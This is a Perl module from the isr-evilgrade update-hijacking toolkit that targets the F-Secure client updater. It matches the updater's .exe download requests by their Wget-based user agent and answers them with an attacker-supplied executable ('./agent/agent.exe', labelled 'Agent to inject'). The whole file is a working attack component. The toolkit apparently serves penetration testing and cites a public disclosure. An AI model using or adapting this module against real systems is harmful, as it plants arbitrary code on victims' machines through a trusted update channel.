###############
# fsecure_client.pm
#
# Copyright 2017 Matias Ariel Re Medina
#
# Info:
# http://seclists.org/fulldisclosure/2017/Mar/28
# Credits to @MaKolarik
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##

package modules::fsecure_client;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'F-Secure client',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{F-Secure client },
    # 'vh'          => '',
    'useragent' => 'true', # true
    'request'     => [
        {   'req'    => '\.exe',,
            'useragent' => 'Wget/(\d+\.)*\d+ F-SecureSoftwareUpdater',
            'agent' => '',
            'type'   => 'agent',
            'method' => '',
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file' => '',
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.exe',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_} ;
    return bless $self, $class;
}
1;
